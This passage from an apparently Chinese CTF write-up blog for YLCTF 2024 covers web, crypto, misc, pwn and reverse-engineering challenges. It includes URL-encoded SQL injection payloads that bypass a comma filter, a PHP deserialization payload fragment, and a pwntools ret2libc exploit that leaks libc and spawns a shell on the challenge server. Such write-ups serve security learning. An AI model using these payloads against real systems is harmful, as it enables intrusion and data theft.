class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1;N&#x27;</span>, <span class="hljs-string">&#x27;0;N&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-comment">// 输出 URL 编码后的字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/pexpl.png" alt="pexpl"></p><h5 id="round-1-sinxx复现"><a class="markdownIt-Anchor" href="#round-1-sinxx复现"></a> [Round 1] sInXx(复现)</h5><p>这题在写的时候一直没找到注入点，跟着复现一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09and%09(1=1)%23<br></code></pre></td></tr></table></figure><p>这个是有回显的，看下面的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09and%09(1=2)%23<br></code></pre></td></tr></table></figure><p>这个就是无回显的</p><p>然后接着继续测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09union%09select%091,2,3,4%23<br></code></pre></td></tr></table></figure><p>测试发现<code>,</code>应该被过滤了，可以用别名进行查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%091)A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure><p>继续测(不是MySQL的数据库，而是sql sever的数据库)</p><p><code>sys.schema_table_statistics_with_buffer</code> 是一个系统表，通常在 SQL Server 中存在，包含关于表的统计信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%09GROUP_CONCAT(TABLE_NAME)FROM%09sys.schema_table_statistics_with_buffer%09WHERE%09TABLE_SCHEMA=DATABASE())A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/sInXx.png" alt="sInXx"></p><p>继续往下测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%09`2`%09FROM%09(SELECT%09*%09FROM%09((SELECT%091)a%09JOIN%09(SELECT%092)b)%09UNION%09SELECT%09*%09FROM%09DataSyncFLAG)p%09limit%092%09offset%091)A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure><p>最后得到了flag这个数据库没怎么遇见过涨知识了,</p><p>还有一道java我最近刚开始学，先不复现了。</p><h3 id="round-2"><a class="markdownIt-Anchor" href="#round-2"></a> Round 2</h3><h4 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h4><h5 id="round-2-ezaes"><a class="markdownIt-Anchor" href="#round-2-ezaes"></a> [Round 2] ezAES</h5><p>key和iv需要进行填充，得到字符串只会输入靶场得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_bytes</span>(<span class="hljs-params">data, size</span>):<br>    <span class="hljs-keyword">return</span> data[:size].ljust(size, <span class="hljs-string">b&#x27;\0&#x27;</span>)<br><br><span class="hljs-comment"># Adjust key and IV to be exactly 16 bytes</span><br>key = adjust_bytes(<span class="hljs-string">b&#x27;YLCTF-CRYPTO&#x27;</span>, <span class="hljs-number">16</span>)<br>iv = adjust_bytes(<span class="hljs-string">b&#x27;YLCTF-IV&#x27;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Key:&quot;</span>, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IV:&quot;</span>, iv)<br><br><span class="hljs-comment"># The encrypted data</span><br>encrypted_data = <span class="hljs-string">b&#x27;\xed\x1d]\xe6p\xb7\xfa\x90/Gu\xf4\xe2\x96\x84\xef90\x92e\xb4\xf8]&quot;\xfc6\xf8\x8cS\xe9b\x19&#x27;</span><br><br><span class="hljs-comment"># Create the AES cipher object</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br><br><span class="hljs-comment"># Decrypt the data</span><br>decrypted_data = cipher.decrypt(encrypted_data)<br><br><span class="hljs-comment"># Remove padding</span><br><span class="hljs-keyword">try</span>:<br>    unpadded_data = unpad(decrypted_data, AES.block_size)<br>    <span class="hljs-comment"># Convert to string</span><br>    flag = unpadded_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag:&quot;</span>, flag)<br><span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decryption failed. Error:&quot;</span>, <span class="hljs-built_in">str</span>(e))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Raw decrypted data:&quot;</span>, decrypted_data)<br></code></pre></td></tr></table></figure><h5 id="round-2-ancat三血"><a class="markdownIt-Anchor" href="#round-2-ancat三血"></a> [Round 2] ancat(三血)</h5><p>通过反 Arnold 变换对图像进行解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold_decode</span>(<span class="hljs-params">image, shuffle_times, a, b</span>):<br><br>    decode_image = np.zeros(shape=image.shape, dtype=np.uint8)<br>    h, w = image.shape[<span class="hljs-number">0</span>], image.shape[<span class="hljs-number">1</span>]<br>    N = h  <span class="hljs-comment"># Assuming square image, otherwise use min(h, w)</span><br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_times):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>                new_x = ((a*b+<span class="hljs-number">1</span>)*x + (-b)*y) % N<br>                new_y = (-a*x + y) % N<br>                decode_image[new_x, new_y, :] = image[x, y, :]<br>        image = np.copy(decode_image)<br><br>    cv2.imwrite(<span class="hljs-string">&#x27;de_flag.png&#x27;</span>, decode_image, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> decode_image<br><br><span class="hljs-comment"># Usage</span><br>img = cv2.imread(<span class="hljs-string">&#x27;en_flag.png&#x27;</span>)<br>decoded_img = arnold_decode(img, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>)<br></code></pre></td></tr></table></figure><h5 id="round-2-hhhhhash二血"><a class="markdownIt-Anchor" href="#round-2-hhhhhash二血"></a> [Round 2] hhhhhash(二血)</h5><p>通过 RSA 加密和解密的操作，生成一个由 <code>2</code> 和 <code>3</code> 相关的预映像。该预映像是由两个固定值 <code>2</code> 和 <code>3</code>，以及它们加密后异或的解密结果组成的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br><span class="hljs-comment"># 给定的 RSA 参数</span><br>N = <span class="hljs-number">24187393262220937846390501443742832858626434119009614437585110078354058452015513549456536194956883531427150348615517313864237793745207153851247294085645697596388459039963846522372296585446089302800483043022329465803710493794211051569707438274254451965191340677881575500674368344178840546343108889174677894222885416258598492663798090390503785098514218961277236306118846673370386248291600553097856252637702622367340613301550171775336709322733018489345819827313673171715980174821509418454309036717777663660169340209676530313209371349708592854940984111594670893579387030559835418881208057159859916049414143236495356055079</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 计算 c = pow(2, e, N) ^ pow(3, e, N)</span><br>c = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e, N) ^ <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, e, N)<br><br><span class="hljs-comment"># 计算 phi 和 d</span><br>phi = N - <span class="hljs-number">1</span>  <span class="hljs-comment"># 注意：这个假设只在 N 是梅森素数时成立</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># 计算 x</span><br>x = <span class="hljs-built_in">pow</span>(c, d, N)<br><br><span class="hljs-comment"># 将结果转换为字节并编码为十六进制</span><br>b0 = (<span class="hljs-number">2</span>).to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br>b1 = (<span class="hljs-number">3</span>).to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br>b2 = x.to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-comment"># 组合最终的 preimage</span><br>preimage = b0 + b1 + b2<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Calculated preimage:&quot;</span>)<br><span class="hljs-built_in">print</span>(preimage)<br></code></pre></td></tr></table></figure><h5 id="round-2-rand一血"><a class="markdownIt-Anchor" href="#round-2-rand一血"></a> [Round 2] rand(一血)</h5><p>参考<a href="https://zhuanlan.zhihu.com/p/659030157">ASIS2023 Crypto - 知乎 (zhihu.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">46464</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):  <span class="hljs-comment"># 本地测试不知道要多少轮，直接拉到400得到flag会自己断的</span><br>    line = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>.encode())<br>    line_decoded = line.decode()<br>    <span class="hljs-built_in">print</span>(line_decoded)  <span class="hljs-comment"># 打印解码后的内容</span><br><br>    numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, line_decoded)<br>    <span class="hljs-keyword">if</span> numbers:<br>        p_value = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>])<br>        g = p_value - <span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p_value)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;g:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(line.decode())<br><br>        p.sendline(<span class="hljs-built_in">str</span>(g).encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;g =&quot;</span>, g)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(line.decode())<br><br>        x = <span class="hljs-number">2</span><br>        y = p_value - <span class="hljs-number">2</span><br>        p.sendline(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;x&#125;</span>,<span class="hljs-subst">&#123;y&#125;</span>&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending: <span class="hljs-subst">&#123;x&#125;</span>,<span class="hljs-subst">&#123;y&#125;</span>&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> Misc</h4><h5 id="round-2-imgai三血"><a class="markdownIt-Anchor" href="#round-2-imgai三血"></a> [Round 2] IMGAI(三血)</h5><p>和iscc 2024的re题有点相似，也是需要识别图片转得知文字，利用模型得到答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MNISTCNN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MNISTCNN, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">5</span>)<br>        <span class="hljs-variable language_">self</span>.fc1 = nn.Linear(<span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.fc2 = nn.Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.relu = nn.ReLU()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv1(x)))<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv2(x)))<br>        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>)<br>        x = <span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.fc1(x))<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.fc2(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_model</span>(<span class="hljs-params">model_path</span>):<br>    model = MNISTCNN()<br>    model.load_state_dict(torch.load(model_path, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>)))<br>    model.<span class="hljs-built_in">eval</span>()<br>    <span class="hljs-keyword">return</span> model<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess_image</span>(<span class="hljs-params">binary_data</span>):<br>    image_array = np.array([<span class="hljs-built_in">int</span>(pixel) <span class="hljs-keyword">for</span> pixel <span class="hljs-keyword">in</span> binary_data]).reshape(<span class="hljs-number">480</span>, <span class="hljs-number">640</span>)<br>    image = Image.fromarray(np.uint8(image_array * <span class="hljs-number">255</span>), mode=<span class="hljs-string">&#x27;L&#x27;</span>)<br>    transform = transforms.Compose([<br>        transforms.Resize((<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),<br>        transforms.ToTensor(),<br>        transforms.Normalize((<span class="hljs-number">0.1307</span>,), (<span class="hljs-number">0.3081</span>,))<br>    ])<br>    <span class="hljs-keyword">return</span> transform(image).unsqueeze(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">predict_digit</span>(<span class="hljs-params">model, image</span>):<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        output = model(image)<br>        <span class="hljs-keyword">return</span> torch.<span class="hljs-built_in">max</span>(output, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].item()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">30991</span>)<br>        model = load_model(<span class="hljs-string">&#x27;model.pth&#x27;</span>)<br>        predictions = []<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">36</span>):<br>            <span class="hljs-keyword">try</span>:<br>                data = p.recvuntil(<span class="hljs-string">f&quot;input num <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span> \n&quot;</span>.encode(), timeout=<span class="hljs-number">3</span>)<br>                binary_data = re.findall(<span class="hljs-string">r&quot;[01]+&quot;</span>, data.decode())<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> binary_data:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;No binary data found in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>. Exiting...&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br><br>                image = preprocess_image(binary_data[<span class="hljs-number">0</span>].strip())<br>                predicted = predict_digit(model, image)<br>                predictions.append(predicted)<br><br>                p.sendline(<span class="hljs-built_in">str</span>(predicted).encode())<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: Predicted digit: <span class="hljs-subst">&#123;predicted&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">except</span> EOFError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection closed unexpectedly in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br>        final_data = p.recvall(timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Final server response:&quot;</span>, final_data.decode())<br><br>        predicted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, predictions))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All predicted digits as a string:&quot;</span>, predicted_string)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">locals</span>():<br>            p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h5 id="round-2-trace"><a class="markdownIt-Anchor" href="#round-2-trace"></a> [Round 2] Trace</h5><p>图片用010打开发现后面一大段有base64编码，去赛博转换一下得到一个rar文件，PassFabforRAR解密一下，得到密码370950解密得到里面的图片</p><img src="/../../images/ylctf/2024/test.png" alt="test" style="zoom:50%;"><p>仔细在记事本上研究了一会拼出了flag</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">YLCTF&#123;ccfe9e2c-391f-4055-a128-c06b65426c83&#125;<br></code></pre></td></tr></table></figure><h4 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> Pwn</h4><h5 id="round-2-ezstack2"><a class="markdownIt-Anchor" href="#round-2-ezstack2"></a> [Round 2] ezstack2</h5><p>有nx保护</p><p>ida看，stack里有栈溢出，vuln里有判断执行system(“sh”)。</p><p><img src="/../../images/ylctf/2024/stack1.png" alt="stack1"></p><p>通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc的地址.</p><p>使用ROPgadget获取pop_rdi和ret地址,通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc地址,最后泄露libc地址和执行system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">25160</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>rdi = <span class="hljs-number">0x400823</span><br>main = <span class="hljs-number">0x40070A</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">8</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload1)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x40056e</span>) + p64(rdi) + p64(binsh) + p64(sys)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/stack2.png" alt="stack2"></p><h4 id="re-2"><a class="markdownIt-Anchor" href="#re-2"></a> Re</h4><h5 id="round-2-三点几啦饮茶先"><a class="markdownIt-Anchor" href="#round-2-三点几啦饮茶先"></a> [Round 2] 三点几啦饮茶先</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decipher</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = v<br>    <span class="hljs-built_in">sum</span> = (<span class="hljs-number">289739961</span> * <span class="hljs-number">40</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># Initial sum value</span><br>    delta = <span class="hljs-number">289739961</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>        v1 -= (((v0 &gt;&gt; <span class="hljs-number">5</span>) ^ (<span class="hljs-number">16</span> * v0)) + v0) ^ (k[(<span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + <span class="hljs-built_in">sum</span>)<br>        v1 &amp;= <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-built_in">sum</span> -= delta<br>        <span class="hljs-built_in">sum</span> 